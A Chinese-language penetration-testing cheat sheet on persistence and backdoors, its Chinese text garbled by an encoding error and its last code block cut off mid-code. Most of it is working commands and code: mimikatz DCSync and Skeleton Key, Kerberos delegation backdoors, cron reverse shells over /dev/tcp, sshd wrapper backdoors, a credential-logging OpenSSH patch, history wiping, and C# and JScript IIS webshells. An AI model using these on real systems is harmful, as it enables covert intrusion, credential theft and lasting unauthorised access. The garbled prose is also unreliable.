<pre><code>ä½¿ç”¨mimikatzçš„dcsyncæå–ç”¨æˆ·hash
&gt;lsadump::dcsync /domain:zone.com /user:y
</code></pre>
<p><img src="./img/554.png" alt="image"></p>
<pre><code>å¸ƒç½®åé—¨
&gt;Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount è´¦æˆ·
</code></pre>
<p><img src="./img/555.png" alt="image"></p>
<pre><code>å¸ƒç½®å®Œæˆååˆ©ç”¨ï¼Œç™»å½•è´¦æˆ·y
è§¦å‘åé—¨
&gt;Rubeus.exe s4u /user:y /aes256:&#123;aes256&#125; /domain:zone.com /msdsspn:krbtgt /impersonateuser:godadmin
</code></pre>
<p><img src="./img/556.png" alt="image"></p>
<pre><code>æ³¨å…¥ç¥¨æ®ï¼Œè·å–åŸŸæ§çš„CIFSã€LDAPæœåŠ¡
&gt;Rubeus.exe asktgs /ticket:&#123;&#125; /service:cifs/dc.zone.com,ldap/dc.zone.com /ptt
</code></pre>
<p><img src="./img/557.png" alt="image"><br><img src="./img/558.png" alt="image"><br><img src="./img/559.png" alt="image"><br><img src="./img/560.png" alt="image"></p>
<h3 id="å—é™å§”æ´¾åé—¨"><a href="#å—é™å§”æ´¾åé—¨" class="headerlink" title="å—é™å§”æ´¾åé—¨"></a>å—é™å§”æ´¾åé—¨</h3><pre><code>http://192.168.0.107/ps/nishang/ActiveDirectory/Add-ConstrainedDelegationBackdoor.ps1
æ–°å¢ä¸€ä¸ªå—é™å§”æ´¾æœåŠ¡è´¦æˆ·ï¼Œæˆ–æ·»åŠ å—é™å§”æ´¾åé—¨åŠŸèƒ½ç»™ä¸€ä¸ªå·²çŸ¥è´¦æˆ·å¯†ç å­˜åœ¨çš„æœåŠ¡è´¦æˆ·ã€‚
éœ€è¿è¡Œåœ¨åŸŸæ§åˆ¶å™¨ä¸Šï¼Œæœ¬æ¬¡æ¼”ç¤ºçš„æ˜¯æ–°å»ºåé—¨è´¦æˆ·ï¼Œè‹¥æ˜¯ç»™å·²çŸ¥è´¦æˆ·å¯†ç çš„æœåŠ¡è´¦æˆ·æ·»åŠ åŠŸèƒ½ï¼Œæ­¥éª¤ä¸€è‡´ã€‚
PS &gt; Add-ConstrainedDelegationBackdoor -SamAccountName backdoor -Domain zone.com -AllowedToDelegateTo ldap/dc.zone.com
å¯†ç é»˜è®¤ä¸ºPassword@123!å¯ä»¥ä¿®æ”¹è„šæœ¬ä¸­$Passwordå‚æ•°ä¿®æ”¹å¯†ç ã€‚
</code></pre>
<p><img src="./img/561.png" alt="image"><br><img src="./img/562.png" alt="image"></p>
<pre><code>https://github.com/samratashok/ADModule
å¯¼å…¥ADModuleä¸­çš„Microsoft.ActiveDirectory.Management.dllå’ŒImport-ActiveDirectory.ps1
&gt;Import-Module Microsoft.ActiveDirectory.Management.dll -Verbose
&gt;Import-Module Import-ActiveDirectory.ps1
ç°ä»¥åŸŸå†…æ™®é€šç”¨æˆ·yç™»å½•ä¸€å°åŸŸå†…æœºå™¨sub2k8ï¼Œä½¿ç”¨kekeoè·å–TGT
Kekeo#tgt::ask /user:backdoor /domain:zone.com /password:Passowrd@123!
</code></pre>
<p><img src="./img/563.png" alt="image"></p>
<pre><code>Kekeo#tgs::s4u /tgt:TGT_backdoor@ZONE.COM_krbtgt~zone.com@ZONE.COM.kirbi /user:godadmin@zone.com /service:ldap/dc.zone.comè·å–ä»¥åŸŸç®¡ç†èº«ä»½è®¿é—®ldapçš„TGS 
</code></pre>
<p><img src="./img/564.png" alt="image"></p>
<pre><code>ä½¿ç”¨mimikatzå†™å…¥TGSç¥¨æ®
mimikatz#kerberos::ptt C:\Users\y.ZONE\Desktop\kekeo\x64\TGS_godadmin@zone.com@ZONE.COM_ldap~dc.zone.com@ZONE.COM.kirbi
</code></pre>
<p><img src="./img/565.png" alt="image"></p>
<pre><code>æ¥ä¸‹æ¥å°±å¯ä»¥dcsyncå¯¼å‡ºkrbtgtçš„hashï¼Œé€šè¿‡krbtgtä¼ªé€ é»„é‡‘ç¥¨æ®
mimikatz#lsadump::dcsync /user:krbtgt /domain:zone.com
</code></pre>
<p><img src="./img/566.png" alt="image"></p>
<h3 id="Skeleton-Keyä¸‡èƒ½é’¥åŒ™"><a href="#Skeleton-Keyä¸‡èƒ½é’¥åŒ™" class="headerlink" title="Skeleton Keyä¸‡èƒ½é’¥åŒ™"></a>Skeleton Keyä¸‡èƒ½é’¥åŒ™</h3><pre><code>åŸŸæ§ä¸Šä½¿ç”¨mimikatzæ‰§è¡Œ
&gt;privilege::debug
&gt;misc::skeleton
</code></pre>
<p><img src="./img/567.png" alt="image"></p>
<pre><code>å¯ä»¥ä½¿ç”¨åŸŸå†…ä»»ä½•è´¦å·ä»¥å¯†ç mimikatzç™»å½•ä»»æ„åŸŸå†…ä¸»æœº
ä½¿ç”¨Empireæ¨¡å—
&gt;usemodule persistence/misc/skeleton_key*
ç»•è¿‡LSA Protection
&gt;privilege::debug
&gt;!+
&gt;!processprotect /process:lsass.exe /remove
&gt;misc::skeleton
</code></pre>
<h3 id="å”¯ä¸€IPè®¿é—®"><a href="#å”¯ä¸€IPè®¿é—®" class="headerlink" title="å”¯ä¸€IPè®¿é—®"></a>å”¯ä¸€IPè®¿é—®</h3><pre><code>&gt;msfvenom -p windows/shell_hidden_bind_tcp LPORT=443 AHOST=192.168.0.107 -f exe &gt; svchost.exe
åªæœ‰å½“107è¿™å°æœºå™¨è¿æ¥æ—¶å¯è·å¾—shellï¼Œå…¶ä»–æœºå™¨ä¸å¯ä»¥ã€‚
</code></pre>
<p><img src="./img/568.png" alt="image"><br><img src="./img/569.png" alt="image"><br><img src="./img/570.png" alt="image"></p>
<h3 id="Linux-cronåé—¨"><a href="#Linux-cronåé—¨" class="headerlink" title="Linux cronåé—¨"></a>Linux cronåé—¨</h3><pre><code>&gt;msfvenom -p cmd/unix/reverse_bash LHOST=192.168.0.107 LPORT=12138 -f raw &gt; /var/www/html/shell.sh
(crontab -l;printf &quot;*/1 * * * * /bin/bash /tmp/shell.sh;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&quot;)|crontab -
</code></pre>
<p><img src="./img/571.png" alt="image"></p>
<pre><code>#!bash
(crontab -l;printf &quot;*/60 * * * * exec 9&lt;&gt; /dev/tcp/192.168.1.1/53;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&quot;)|crontab -
</code></pre>
<h3 id="Straceè®°å½•sshå¯†ç "><a href="#Straceè®°å½•sshå¯†ç " class="headerlink" title="Straceè®°å½•sshå¯†ç "></a>Straceè®°å½•sshå¯†ç </h3><pre><code>å®‰è£…strace
#apt-get install strace
#vi ~/.bashrc
æ·»åŠ 
alias ssh=&#39;strace -o /tmp/.log -e read,write,connect -s 2048 ssh&#39;
</code></pre>
<h3 id="SSHDåé—¨"><a href="#SSHDåé—¨" class="headerlink" title="SSHDåé—¨"></a>SSHDåé—¨</h3><pre><code>&gt;ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337;
æ‰§è¡Œåå¼€å¯31337ç«¯å£ï¼Œä½¿ç”¨rootä»»æ„å¯†ç ç™»å½•
&gt;ssh root@192.168.1.1 -p 31337
</code></pre>
<h3 id="è¿›ç¨‹æ³¨å…¥-1"><a href="#è¿›ç¨‹æ³¨å…¥-1" class="headerlink" title="è¿›ç¨‹æ³¨å…¥"></a>è¿›ç¨‹æ³¨å…¥</h3><pre><code>http://cymothoa.sourceforge.net/
é¶æœº&gt;./cymothoa -p è¿›ç¨‹PID -s 1 -y ç«¯å£
æ”»å‡»æœº&gt;nc -vv ip ç«¯å£
</code></pre>
<h3 id="SSH-wrapperåé—¨"><a href="#SSH-wrapperåé—¨" class="headerlink" title="SSH wrapperåé—¨"></a>SSH wrapperåé—¨</h3><pre><code>#cd /usr/sbin
#mv sshd ../bin
#echo &#39;#!/usr/bin/perl&#39; &gt;sshd
#echo &#39;exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..4A/);&#39; &gt;&gt;sshd
#echo &#39;exec &#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#39; &gt;&gt;sshd
#chmod u+x sshd
#/etc/init.d/sshd restart
æ”»å‡»æœºæ‰§è¡Œ
&gt;socat STDIO TCP4:192.168.0.110:22,sourceport=13377
</code></pre>
<p><img src="./img/572.png" alt="image"></p>
<h3 id="SUID-Shell"><a href="#SUID-Shell" class="headerlink" title="SUID Shell"></a>SUID Shell</h3><pre><code>&gt;cp /bin/bash /tmp/tmp
&gt;chmod u+s /tmp/tmp
&gt;/tmp/tmp -p
</code></pre>
<h3 id="SSHå…¬ç§é’¥ç™»å½•"><a href="#SSHå…¬ç§é’¥ç™»å½•" class="headerlink" title="SSHå…¬ç§é’¥ç™»å½•"></a>SSHå…¬ç§é’¥ç™»å½•</h3><pre><code>&gt;vim /etc/ssh/sshd_confå–æ¶ˆä»¥ä¸‹æ³¨é‡Š
</code></pre>
<p><img src="./img/573.png" alt="image"></p>
<pre><code>&gt;ssh-keygenç”Ÿæˆ
å¤åˆ¶/root/.ssh/id_rsa.pubæ–‡ä»¶åˆ°æ”»å‡»ç«¯çš„/root/.ssh/authorized_keys
&gt;ssh -i id_rsa targer@1.1.1.1
</code></pre>
<h3 id="Reptile"><a href="#Reptile" class="headerlink" title="Reptile"></a>Reptile</h3><pre><code>https://github.com/f0rb1dd3n/Reptile
å®‰è£…
&gt;apt install build-essential libncurses-dev linux-headers-$(uname -r)
&gt;git clone https://github.com/f0rb1dd3n/Reptile.git
</code></pre>
<h3 id="Kbeast-rootkit"><a href="#Kbeast-rootkit" class="headerlink" title="Kbeast_rootkit"></a>Kbeast_rootkit</h3><pre><code>http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz
version - 0 : 2.6.18 (RHEL/CentOS 5.x)
          1 : 2.6.32 (Ubuntu 10.x) [default version]
ä¿®æ”¹é…ç½®config.h
å®‰è£…è·¯å¾„ã€æ—¥å¿—è·¯å¾„ã€ç«¯å£ã€è¿æ¥å¯†ç ã€è¿æ¥ç”¨æˆ·
</code></pre>
<p><img src="./img/574.png" alt="image"></p>
<pre><code>./setup build
æ”»å‡»æœºè¿æ¥
&gt;telnet 192.168.1.1 13377
</code></pre>
<h3 id="OpenSSHåé—¨"><a href="#OpenSSHåé—¨" class="headerlink" title="OpenSSHåé—¨"></a>OpenSSHåé—¨</h3><pre><code>ä¸‹è½½
http://ftp.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz
http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz
å¤‡ä»½é…ç½®æ–‡ä»¶
&gt;mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old
&gt;mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old
å®‰è£…å…³è”æ–‡ä»¶
centos
&gt;yum install -y openssl openssl-devel pam-devel zlib zlib-devel
Ubuntu
&gt;apt-get install -y openssl libssl-dev libpam0g-dev
&gt;tar zxvf openssh-5.9p1.tar.gz 
&gt;tar zxvf 0x06-openssh-5.9p1.patch.tar.gz 
&gt;cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1/
&gt;cd openssh-5.9p1
&gt;patch &lt;sshbd5.9p1.diff
&gt;vim includes.h
</code></pre>
<p><img src="./img/575.png" alt="image"></p>
<pre><code>/tmp/ilogè®°å½•ç™»å½•åˆ°æœ¬æœºçš„ç”¨æˆ·å¯†ç 
/tmp/ologè®°å½•æœ¬æœºç™»å½•å…¶ä»–æœºå™¨çš„è´¦æˆ·å¯†ç 
æ—¥å¿—æ–‡ä»¶å‰å¯ä»¥åŠ ä¸ª.éšè—èµ·æ¥
SECRETPWæ˜¯è¿æ¥åé—¨å¯†ç 
æŸ¥çœ‹å½“å‰ç‰ˆæœ¬
&gt;ssh -V
</code></pre>
<p><img src="./img/576.png" alt="image"></p>
<pre><code>ä¿®æ”¹version.hæ”¹ä¸ºå½“å‰ç‰ˆæœ¬
</code></pre>
<p><img src="./img/577.png" alt="image"></p>
<pre><code>ç¼–è¯‘å®‰è£…
Centos7
&gt;./configure --prefix=/usr/ --sysconfdir=/etc/ssh/ --with-pam --with-kerberos5
&gt;make clean
&gt;make &amp;&amp; make install
&gt;systemctl restart sshd.service
ubuntu
&gt;./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam
&gt;make clean
&gt;make&amp;&amp;make install
é‡å¯æœåŠ¡ï¼Œä¿®æ”¹æ–‡ä»¶æ—¥å¿—
&gt;touch -r/etc/ssh/ssh_config.old /etc/ssh/ssh_config
&gt;touch -r/etc/ssh/sshd_config.old /etc/ssh/sshd_config
</code></pre>
<p><img src="./img/578.png" alt="image"><br><img src="./img/579.png" alt="image"></p>
<pre><code>æ¸…é™¤ç—•è¿¹
&gt;export HISTFILE=/dev/null
&gt;export HISTSIZE=0
&gt;export HISTFILESIZE=0
&gt;sed -i &#39;s/192.168.0.1/127.0.0.1/g&#39; /root/.bash_history
</code></pre>
<h3 id="IPTablesç«¯å£å¤ç”¨"><a href="#IPTablesç«¯å£å¤ç”¨" class="headerlink" title="IPTablesç«¯å£å¤ç”¨"></a>IPTablesç«¯å£å¤ç”¨</h3><pre><code>&gt;iptables -t nat -N LETMEIN 
&gt;iptables -t nat  -A LETMEIN -p tcp -j REDIRECT --to-port 22
# å¼€å¯å¼€å…³
&gt;iptables -A INPUT -p tcp -m string --string &#39;threathuntercoming&#39; --algo bm -m recent --set --name letmein --rsource -j ACCEPT
# å…³é—­å¼€å…³
&gt;iptables -A INPUT -p tcp -m string --string &#39;threathunterleaving&#39; --algo bm -m recent --name letmein --remove -j ACCEPT
&gt;iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN
æ”»å‡»ç«¯ï¼š
#å¼€å¯å¤ç”¨
&gt;echo threathuntercoming | socat - tcp:192.168.0.110:80
#sshä½¿ç”¨80ç«¯å£è¿›è¡Œç™»å½•
ssh -p 80 root@192.168.0.110
#å…³é—­å¤ç”¨
echo threathunterleaving | socat - tcp:192.168.0.110:80
</code></pre>
<p><img src="./img/580.png" alt="image"></p>
<h3 id="æ–‡ä»¶å¤„ç†"><a href="#æ–‡ä»¶å¤„ç†" class="headerlink" title="æ–‡ä»¶å¤„ç†"></a>æ–‡ä»¶å¤„ç†</h3><pre><code>&gt;chattr +I shell.sh
</code></pre>
<p><img src="./img/581.png" alt="image"></p>
<pre><code>&gt;vim .shell.sh
</code></pre>
<p><img src="./img/582.png" alt="image"></p>
<pre><code>&gt;attrib +s +h +r 1.txt
</code></pre>
<p><img src="./img/583.png" alt="image"></p>
<pre><code>&gt;touch -r 1.file 2.file ä¿®æ”¹2fileæ–‡ä»¶çš„æ—¶é—´è·Ÿ1fileæ—¶é—´ç›¸åŒ
</code></pre>
<h3 id="IIS-Bin-Backdoor"><a href="#IIS-Bin-Backdoor" class="headerlink" title="IIS_Bin_Backdoor"></a>IIS_Bin_Backdoor</h3><pre><code>From:https://github.com/WBGlIl/IIS_backdoor
IIS_backdoor_dll.dlæ”¾å…¥ web ç›®å½•çš„ bin æ–‡ä»¶å¤¹ä¸­é…ç½® web.config æ–‡ä»¶
</code></pre>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>system.webServer</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modules</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>add</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>IIS_backdoor<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>IIS_backdoor_dll.IISModule<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modules</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>system.webServer</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre><code>IIS_backdoor_shell.exeæ‰§è¡Œå‘½ä»¤
</code></pre>
<p><img src="./img/584.png" alt="image"></p>
<pre><code>ä½¿ç”¨IISBackdoorå¤ªæ˜æ˜¾ï¼Œå®¹æ˜“è¢«çœ‹å‡ºæ˜¯åé—¨ï¼Œè¿™é‡Œå¯¹åé—¨æ”¹å
</code></pre>
<p><img src="./img/585.png" alt="image"><br><img src="./img/586.png" alt="image"><br><img src="./img/587.png" alt="image"></p>
<pre><code>é‡æ–°ç”Ÿæˆè§£å†³æ–¹æ¡ˆï¼Œdllæ”¾å…¥binç›®å½•ï¼Œweb.configä¿®æ”¹ä¸º
</code></pre>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>system.webServer</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modules</span><span class="token punctuation">></span></span>
      		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>add</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UrlRoutingModule<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UrlRoutingModule.IISModule<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modules</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>system.webServer</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre><code>æ·»åŠ å®Œä¹‹åä¼šè‡ªåŠ¨åœ¨æ¨¡å—ä¸­æ³¨å†Œå¥½
</code></pre>
<p><img src="./img/588.png" alt="image"></p>
<pre><code>æ‰§è¡Œpayloadï¼Œmsfç”Ÿæˆrawæ ¼å¼payloadï¼Œé€‰æ‹©shellcodeé€‰é¡¹ï¼Œrawæ–‡ä»¶æ‹–å…¥å³å¯
&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f raw -o /var/www/html/1.raw
</code></pre>
<p><img src="./img/589.png" alt="image"></p>
<h3 id="IIS-NETDLL-Spy"><a href="#IIS-NETDLL-Spy" class="headerlink" title="IIS_NETDLL_Spy"></a>IIS_NETDLL_Spy</h3><pre><code>From:https://github.com/Ivan1ee/NetDLLSpy
åŸä½œè€…æåŠä¸‰ç§æ–¹å¼ï¼Œç¬¬ä¸€ç§ç¼–è¯‘ä»£ç ä¸ºDLLæ–°å»ºaspxæ–‡ä»¶å®ä¾‹åŒ–åé—¨ç±»æ¥æ‰§è¡Œå‘½ä»¤ï¼Œç¬¬äºŒç§æ˜¯åšhttphandleræ˜ å°„å¯æŒ‡å®šä¸€ä¸ªåç¼€æ‰§è¡Œå‘½ä»¤ä¿å­˜æ–‡ä»¶åœ¨webæœåŠ¡å™¨ä¸Šï¼Œå†è¯»å–ç»“æœã€‚ç¬¬ä¸‰ç§æ˜¯ä½¿ç”¨jsc.exeç¼–è¯‘jsè„šæœ¬ç”Ÿæˆdllï¼Œæ·»åŠ æ˜ å°„èœåˆ€è¿æ¥ã€‚
è¿™é‡Œæ ¹æ®åŸä½œè€…çš„ä»£ç ï¼Œè¿›è¡Œäº†ä¸€ä¸‹ç®€å•çš„ä¿®æ”¹ï¼Œä¿®æ”¹åçš„åŠŸèƒ½ä¸ºæ·»åŠ httphandleræ˜ å°„æŒ‡å®šä¸€ä¸ªåç¼€æ‰§è¡Œå‘½ä»¤æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šï¼Œä¸ç”¨ä¿å­˜åœ¨æœåŠ¡å™¨ä¸­å†è®¿é—®ã€‚
ä»£ç 
</code></pre>
<pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token keyword">using</span> <span class="token namespace">System</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Diagnostics</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>IO</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Text</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Web</span><span class="token punctuation">;</span>
<span class="token keyword">namespace</span> <span class="token namespace">IsapiModules</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Handler</span> <span class="token punctuation">:</span> <span class="token type-list"><span class="token class-name">IHttpHandler</span></span>
	<span class="token punctuation">&#123;</span>
		<span class="token keyword">public</span> <span class="token return-type class-name"><span class="token keyword">bool</span></span> IsReusable
		<span class="token punctuation">&#123;</span>
			<span class="token keyword">get</span>
			<span class="token punctuation">&#123;</span>
				<span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">public</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">ProcessRequest</span><span class="token punctuation">(</span><span class="token class-name">HttpContext</span> context<span class="token punctuation">)</span>
		<span class="token punctuation">&#123;</span>
			<span class="token class-name"><span class="token keyword">string</span></span> input <span class="token operator">=</span> context<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>Form<span class="token punctuation">[</span><span class="token string">"InternetInformationService"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">//command</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>context<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>Form<span class="token punctuation">[</span><span class="token string">"microsoft"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"iis"</span><span class="token punctuation">)</span><span class="token comment">//do command</span>
			<span class="token punctuation">&#123;</span>
				<span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">cmdShell</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">public</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">cmdShell</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">string</span></span> input<span class="token punctuation">)</span>
		<span class="token punctuation">&#123;</span>
			<span class="token class-name">Process</span> process <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">Process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			process<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>FileName <span class="token operator">=</span> <span class="token string">"cmd.exe"</span><span class="token punctuation">;</span>
			process<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>RedirectStandardOutput <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
			process<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>UseShellExecute <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
			process<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>Arguments <span class="token operator">=</span> <span class="token string">"/c "</span> <span class="token operator">+</span> input<span class="token punctuation">;</span>
			process<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>WindowStyle <span class="token operator">=</span> ProcessWindowStyle<span class="token punctuation">.</span>Hidden<span class="token punctuation">;</span>
			process<span class="token punctuation">.</span><span class="token function">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token class-name">StreamReader</span> output <span class="token operator">=</span> process<span class="token punctuation">.</span>StandardOutput<span class="token punctuation">;</span>
			<span class="token class-name">String</span> result <span class="token operator">=</span> output<span class="token punctuation">.</span><span class="token function">ReadToEnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			output<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			output<span class="token punctuation">.</span><span class="token function">Dispose</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			HttpContext<span class="token punctuation">.</span>Current<span class="token punctuation">.</span>Response<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre><code>ä¿å­˜ä¸ºéšæ„åç¼€ï¼Œä½¿ç”¨cscç¼–è¯‘ã€‚
&gt;C:\Windows\Microsoft.NET\Framework\v2.50727\csc.exe /t:library /r:System.Web.dll -out:C:\inetpub\wwwroot\Bin\SystemIO.dll C:\inetpub\wwwroot\bin\code.cs
</code></pre>
<p><img src="./img/590.png" alt="image"></p>
<pre><code>Web.configæ–‡ä»¶æ·»åŠ 
&lt;system.webServer&gt;
    &lt;handlers&gt; 
        &lt;add name=&quot;PageHandlerFactory-ISAPI-2.0-32&quot; path=&quot;*.xxx&quot; verb=&quot;*&quot; type=&quot;IsapiModules.Handler&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Script&quot; preCondition=&quot;integratedMode&quot; /&gt; 
    &lt;/handlers&gt; 
&lt;/system.webServer&gt;
</code></pre>
<p><img src="./img/001.png" alt="image"></p>
<pre><code>æ‰“å¼€IISç®¡ç†å™¨ï¼Œå¯ä»¥çœ‹åˆ°å¤„ç†æ˜ å°„ç®¡ç†å™¨ä¸­å·²ç»æ·»åŠ äº†æ¨¡å—ã€‚
</code></pre>
<p><img src="./img/591.png" alt="image"></p>
<pre><code>ç°åœ¨éšæ„è®¿é—®ä¸ªxxxåç¼€çš„æ–‡ä»¶
</code></pre>
<p><img src="./img/592.png" alt="image"></p>
<pre><code>å¸¦å‚æ•°è®¿é—®
microsoft=iis&amp;InternetInformationService=net user
</code></pre>
<p><img src="./img/593.png" alt="image"><br><img src="./img/594.png" alt="image"></p>
<pre><code>ç¬¬ä¸‰ç§è¿æ¥èœåˆ€ï¼Œè¿™é‡Œä¹Ÿå¯¹ä»£ç ä¿®æ”¹äº†ä¸€ä¸‹ã€‚
</code></pre>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> System<span class="token punctuation">;</span> 
<span class="token keyword">import</span> System<span class="token punctuation">.</span>Web<span class="token punctuation">;</span> 
<span class="token keyword">import</span> System<span class="token punctuation">.</span><span class="token constant">IO</span><span class="token punctuation">;</span> 
<span class="token keyword">package</span> IsapiModule
<span class="token punctuation">&#123;</span> 
	<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Handler</span> <span class="token keyword">implements</span> <span class="token class-name">IHttpHandler</span>
	<span class="token punctuation">&#123;</span> 
		<span class="token keyword">function</span> IHttpHandler<span class="token punctuation">.</span><span class="token function">ProcessRequest</span><span class="token punctuation">(</span><span class="token parameter">context <span class="token operator">:</span> HttpContext</span><span class="token punctuation">)</span>
		<span class="token punctuation">&#123;</span> 
			context<span class="token punctuation">.</span>Response<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"404 Not Found"</span><span class="token punctuation">)</span> 
			<span class="token keyword">var</span> <span class="token constant">I</span> <span class="token operator">=</span> context<span class="token punctuation">;</span> 
			<span class="token keyword">var</span> Request <span class="token operator">=</span> <span class="token constant">I</span><span class="token punctuation">.</span>Request<span class="token punctuation">;</span> 
			<span class="token keyword">var</span> Response <span class="token operator">=</span> <span class="token constant">I</span><span class="token punctuation">.</span>Response<span class="token punctuation">;</span> 
			<span class="token keyword">var</span> Server <span class="token operator">=</span> <span class="token constant">I</span><span class="token punctuation">.</span>Server<span class="token punctuation">;</span> 
			<span class="token function">eval</span><span class="token punctuation">(</span>context<span class="token punctuation">.</span>Request<span class="token punctuation">[</span><span class="token string">"Internet"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//pass</span>
		<span class="token punctuation">&#125;</span> 
